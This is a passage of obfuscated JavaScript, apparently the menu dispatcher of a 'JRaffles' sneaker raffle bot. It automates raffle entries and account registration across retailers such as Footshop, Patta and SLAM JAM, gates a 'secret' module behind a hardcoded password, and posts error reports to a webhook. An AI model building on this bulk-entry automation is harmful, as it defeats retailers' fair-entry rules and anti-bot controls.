                                _0x409619['shuffleTasks'] && await _0x4ff1d7(_0x786ae5), await _0x4f2dc6['function'](_0x4f2dc6, _0x786ae5, _0x399c66);
                            } else {
                                if (taskFunction == 0x1) {
                                    var _0x399c66 = await _0x49a494();
                                    await _0x4f2dc6['function'](_0x4f2dc6, _0x399c66);
                                }
                            }
                        }
                    } catch (_0x4886ce) {
                        console['log'](_0x4886ce), await _0x50b4f8(0x7d0);
                    }
                    return _0xcadc9c();
                }
                if (_0x3d434d[taskModule]['name'] == 'FENOM') {
                    try {
                        taskFunction = await _0x465f5a(_0x3d434d[taskModule]['modules']);
                        var _0x4f2dc6 = _0x3d434d[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x399c66 = await _0x49a494(), _0x266a8f = await _0x5c0f72(_0x4f2dc6);
                            _0x409619['shuffleTasks'] && await _0x4ff1d7(_0x266a8f), await _0x4f2dc6['function'](_0x4f2dc6, _0x266a8f, _0x399c66);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x399c66 = await _0x49a494(), _0x266a8f = await _0x5c0f72(_0x4f2dc6);
                                _0x409619['shuffleTasks'] && await _0x4ff1d7(_0x266a8f), await _0x4f2dc6['function'](_0x4f2dc6, _0x266a8f, _0x399c66);
                            }
                        }
                    } catch (_0x111039) {
                        console['log'](_0x111039), await _0x50b4f8(0xfa0);
                    }
                    return _0xcadc9c();
                }
                if (_0x3d434d[taskModule]['name'] == 'Overkill') {
                    try {
                        taskFunction = await _0x465f5a(_0x3d434d[taskModule]['modules']);
                        var _0x4f2dc6 = _0x3d434d[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x399c66 = await _0x49a494(), _0x266a8f = await _0x5c0f72(_0x4f2dc6);
                            _0x409619['shuffleTasks'] && await _0x4ff1d7(_0x266a8f), await _0x4f2dc6['function'](_0x4f2dc6, _0x266a8f, _0x399c66);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x399c66 = await _0x49a494(), _0x266a8f = await _0x5c0f72(_0x4f2dc6);
                                _0x409619['shuffleTasks'] && await _0x4ff1d7(_0x266a8f), await _0x4f2dc6['function'](_0x4f2dc6, _0x266a8f, _0x399c66);
                            }
                        }
                    } catch (_0x4fe6ac) {
                        console['log'](_0x4fe6ac), await _0x50b4f8(0xfa0);
                    }
                    return _0xcadc9c();
                }
                if (_0x3d434d[taskModule]['name'] == '4ELEMENTOS') {
                    taskFunction = await _0x465f5a(_0x3d434d[taskModule]['modules']);
                    var _0x4f2dc6 = _0x3d434d[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x1) {
                        var _0x399c66 = await _0x49a494();
                        return await _0x4f2dc6['function'](_0x4f2dc6, _0x399c66), _0xcadc9c();
                    }
                    var _0x399c66 = await _0x49a494(), _0x5464a7 = await _0x5c0f72(_0x4f2dc6);
                    return _0x409619['shuffleTasks'] && await _0x4ff1d7(_0x5464a7), await _0x4f2dc6['function'](_0x4f2dc6, _0x5464a7, _0x399c66), _0xcadc9c();
                }
                if (_0x3d434d[taskModule]['name'] == 'OneBlockDown') {
                    taskFunction = await _0x465f5a(_0x3d434d[taskModule]['modules']);
                    var _0x4f2dc6 = _0x3d434d[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x399c66 = await _0x49a494(), _0x5464a7 = await _0x5c0f72(_0x4f2dc6);
                    return _0x409619['shuffleTasks'] && await _0x4ff1d7(_0x5464a7), await _0x4f2dc6['function'](_0x4f2dc6, _0x5464a7, _0x399c66), _0xcadc9c();
                }
                if (_0x3d434d[taskModule]['name'] == 'AFEW\x20Store') {
                    taskFunction = await _0x465f5a(_0x3d434d[taskModule]['modules']);
                    var _0x4f2dc6 = _0x3d434d[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x399c66 = await _0x49a494(), _0x5464a7 = await _0x5c0f72(_0x4f2dc6);
                    return _0x409619['shuffleTasks'] && await _0x4ff1d7(_0x5464a7), await _0x4f2dc6['function'](_0x4f2dc6, _0x5464a7, _0x399c66), _0xcadc9c();
                }
                if (_0x3d434d[taskModule]['name'] == 'EQL') {
                    taskFunction = await _0x465f5a(_0x3d434d[taskModule]['modules']);
                    var _0x4f2dc6 = _0x3d434d[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x399c66 = await _0x49a494(), _0x5464a7 = await _0x5c0f72(_0x4f2dc6);
                    return _0x409619['shuffleTasks'] && await _0x4ff1d7(_0x5464a7), await _0x4f2dc6['function'](_0x4f2dc6, _0x5464a7, _0x399c66), _0xcadc9c();
                } else {
                    if (_0x3d434d[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x465f5a(_0x3d434d[taskModule]['modules']);
                        var _0x4f2dc6 = _0x3d434d[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x0) {
                            var _0x399c66 = await _0x49a494(), _0x1f540f = await _0x5c0f72(_0x4f2dc6);
                            return _0x409619['shuffleTasks'] && await _0x4ff1d7(_0x1f540f), await _0x4f2dc6['function'](_0x4f2dc6, _0x1f540f, _0x399c66), _0xcadc9c();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x399c66 = await _0x49a494();
                                return await _0x4f2dc6['function'](_0x4f2dc6, null, _0x399c66), _0xcadc9c();
                            }
                        }
                        ;
                    } else {
                        if (_0x3d434d[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x465f5a(_0x3d434d[taskModule]['modules']);
                            var _0x4f2dc6 = _0x3d434d[taskModule]['modules'][taskFunction], _0x399c66 = await _0x49a494(), _0x3f37d1 = await _0x5c0f72(_0x4f2dc6);
                            return _0x409619['shuffleTasks'] && await _0x4ff1d7(_0x3f37d1), await _0x4f2dc6['function'](_0x4f2dc6, _0x3f37d1, _0x399c66), await _0x50b4f8(0x1388), _0xcadc9c();
                        } else {
                            if (_0x3d434d[taskModule]['name'] == 'OQIUM\x20Store') {
                                taskFunction = await _0x465f5a(_0x3d434d[taskModule]['modules']);
                                var _0x4f2dc6 = _0x3d434d[taskModule]['modules'][taskFunction];
                                console['clear']();
                                if (taskFunction == 0x0) {
                                    var _0x399c66 = await _0x49a494(), _0x1f540f = await _0x5c0f72(_0x4f2dc6);
                                    return _0x409619['shuffleTasks'] && await _0x4ff1d7(_0x1f540f), await _0x4f2dc6['function'](_0x4f2dc6, _0x1f540f, _0x399c66), _0xcadc9c();
                                } else {
                                    if (taskFunction == 0x1) {
                                        var _0x399c66 = await _0x49a494();
                                        return await _0x4f2dc6['function'](_0x4f2dc6, null, _0x399c66), _0xcadc9c();
                                    }
                                }
                                ;
                            } else {
                                if (_0x3d434d[taskModule]['name'] == 'BOUNCEWEAR') {
                                    taskFunction = await _0x465f5a(_0x3d434d[taskModule]['modules']);
                                    var _0x4f2dc6 = _0x3d434d[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0)
                                        await bwAcc('https://bouncewear.com/nl/account/register', _0x4f2dc6);
                                    else {
                                        if (taskFunction == 0x1) {
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0x3d434d[taskModule]['name'] == 'PATTA') {
                                        taskFunction = await _0x465f5a(_0x3d434d[taskModule]['modules']);
                                        var _0x4f2dc6 = _0x3d434d[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0) {
                                            var _0x399c66 = await _0x49a494(), _0x54bbf9 = await _0x5c0f72(_0x4f2dc6);
                                            return _0x409619['shuffleTasks'] && await _0x4ff1d7(_0x54bbf9), await _0x4f2dc6['function'](_0x4f2dc6, _0x54bbf9, _0x399c66), _0xcadc9c();
                                        } else {
                                            if (taskFunction == 0x1) {
                                                var _0x399c66 = await _0x49a494(), _0x54bbf9 = await _0x5c0f72(_0x4f2dc6);
                                                return _0x409619['shuffleTasks'] && await _0x4ff1d7(_0x54bbf9), await _0x4f2dc6['function'](_0x4f2dc6, _0x54bbf9, _0x399c66), _0xcadc9c();
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0x3d434d[taskModule]['name'] == 'SLAM\x20JAM') {
                                            taskFunction = await _0x465f5a(_0x3d434d[taskModule]['modules']);
                                            var _0x4f2dc6 = _0x3d434d[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0x399c66 = await _0x49a494(), _0x4b5b30 = await _0x5c0f72(_0x4f2dc6);
                                                return _0x409619['shuffleTasks'] && await _0x4ff1d7(_0x4b5b30), await _0x4f2dc6['function'](_0x4f2dc6, _0x4b5b30, _0x399c66), _0xcadc9c();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x399c66 = await _0x49a494(), _0x4b5b30 = await _0x5c0f72(_0x4f2dc6);
                                                    return _0x409619['shuffleTasks'] && await _0x4ff1d7(_0x4b5b30), await _0x4f2dc6['function'](_0x4f2dc6, _0x4b5b30, _0x399c66), _0xcadc9c();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0x3d434d[taskModule]['name'] == 'KICKZ') {
                                                taskFunction = await _0x465f5a(_0x3d434d[taskModule]['modules']);
                                                var _0x4f2dc6 = _0x3d434d[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x399c66 = await _0x49a494(), _0x4298ac = await _0x5c0f72(_0x4f2dc6);
                                                    return _0x409619['shuffleTasks'] && await _0x4ff1d7(_0x4298ac), await _0x4f2dc6['function'](_0x4f2dc6, _0x4298ac, _0x399c66), _0xcadc9c();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x399c66 = await _0x49a494(), _0x4298ac = await _0x5c0f72(_0x4f2dc6);
                                                        return _0x409619['shuffleTasks'] && await _0x4ff1d7(_0x4298ac), await _0x4f2dc6['function'](_0x4f2dc6, _0x4298ac, _0x399c66), _0xcadc9c();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0x3d434d[taskModule]['name'] == 'JD') {
                                                    taskFunction = await _0x465f5a(_0x3d434d[taskModule]['modules']);
                                                    var _0x4f2dc6 = _0x3d434d[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x399c66 = await _0x49a494(), _0x1de897 = await _0x5c0f72(_0x4f2dc6);
                                                        return _0x409619['shuffleTasks'] && await _0x4ff1d7(_0x1de897), await _0x4f2dc6['function'](_0x4f2dc6, _0x1de897, _0x399c66), _0xcadc9c();
                                                    }
                                                } else {
                                                    if (_0x3d434d[taskModule]['name'] == 'Seven\x20Store')
                                                        return console['log']('returning\x20to\x20menu'), await _0x50b4f8(0x3e8), _0xcadc9c();
                                                    else {
                                                        if (_0x3d434d[taskModule]['name'] == 'Paypal\x20Verification') {
                                                            var _0x52d33f = _0x3d434d[taskModule]['name'], _0x399c66 = await _0x49a494();
                                                            return await _0x5d712b(_0x52d33f, _0x399c66), _0xcadc9c();
                                                        } else {
                                                            if (_0x3d434d[taskModule]['name'] == 'Failed\x20Tasks') {
                                                                taskFunction = await _0x465f5a(_0x3d434d[taskModule]['modules']);
                                                                var _0x4f2dc6 = _0x3d434d[taskModule]['modules'][taskFunction];
                                                                return await _0x4f2dc6['function'](_0x4f2dc6), _0xcadc9c();
                                                            } else {
                                                                if (_0x3d434d[taskModule]['name'] == 'Change\x20Settings') {
                                                                    console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                    var _0x3bdc12 = 0x0;
                                                                    for (const _0x31f236 in _0x409619) {
                                                                        console['log']('(' + _0x3bdc12 + ')\x20' + _0x31f236 + '\x20:\x20' + _0x409619[_0x31f236]), _0x3bdc12++;
                                                                    }
                                                                    console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x3bdc12 + ')\x20Return\x20to\x20Main\x20Menu');
                                                                    var _0x3a83a3 = await _0x507c22();
                                                                    if (_0x3a83a3 == _0x3bdc12)
                                                                        return _0xcadc9c();
                                                                    console['clear'];
                                                                    var _0x265c08 = 0x0;
                                                                    for (var _0x2f7dec in _0x409619) {
                                                                        if (_0x3a83a3 == _0x265c08) {
                                                                            console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0x2f7dec + '\x20:'), _0x409619[_0x2f7dec] = await _0x13971c(), _0x39c9ee['writeFileSync']('../settings.json', JSON['stringify'](_0x409619));
                                                                            break;
                                                                        } else
                                                                            _0x265c08++;
                                                                    }
                                                                    return console['log']('Settings\x20Saved!'), await _0x50b4f8(0xbb8), _0xcadc9c();
                                                                } else {
                                                                    if (_0x3d434d[taskModule]['name'] == 'Reload\x20Settings')
                                                                        return console['log']('Reloading\x20settings'), await _0x455fd4(), _0xcadc9c();
                                                                    else {
                                                                        if (taskModule == 0x45) {
                                                                            _0x3d434d[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                            var _0x23e951 = await _0x5ef7ec();
                                                                            _0x23e951 == 'ModuleVoorDeBoys' ? (await afewScraper(), await _0x2775cd(), await afewFunction(_0x377b9d[_0x3f72f1], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0x50b4f8(0xbb8));
                                                                        } else {
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            try {
                await _0xcadc9c();
            } catch (_0x413d76) {
                return console['log'](_0x413d76), _0xcadc9c();
            }
        } catch (_0x4a3f9f) {
            return console['log'](_0x4a3f9f), await _0x50b4f8(0x3a98);
        }
}
;
_0x5b3b18('JRaffles\x20' + _0x41a50b), _0x455fd4();
try {
    _0x362059();
} catch (_0x39b736) {
    var _0x53bc75 = [{
        'type': 'rich',
        'title': 'Main\x20Menu\x20Error',
        'description': '',
        'color': 0xc0d6d6,
        'fields': [
            {
                'name': 'User',
                'value': '' + _0xeaf750
            },
            {
                'name': 'Version',
                'value': '' + _0x41a50b
            },
            {
                'name': 'Error',
                'value': '' + _0x39b736
            }
        ]
    }];
    const _0x3688d3 = { 'embeds': _0x53bc75 };
    _0x21ec0c(_0x451f96, _0x3688d3);
}